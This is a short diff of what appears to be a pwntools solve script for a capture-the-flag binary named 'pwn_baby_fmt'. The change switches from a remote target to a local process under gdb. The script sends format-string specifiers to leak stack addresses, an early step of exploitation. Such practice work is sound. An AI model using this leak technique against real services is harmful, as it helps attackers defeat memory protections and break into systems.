@@ -17,9 +17,9 @@ def leak_addresses(i, delay):
 
     elf = ELF("./pwn_baby_fmt")
     context.binary = elf
-    # p = elf.process()
-    p = remote(IP, port)
-    # gdb.attach(p, gdbscript='''b gets@plt''')
+    p = elf.process()
+    # p = remote(IP, port)
+    gdb.attach(p, gdbscript='''b gets@plt''')
 
     p.recvuntil("What's your town?\n")
     input = f"%{i}$p"
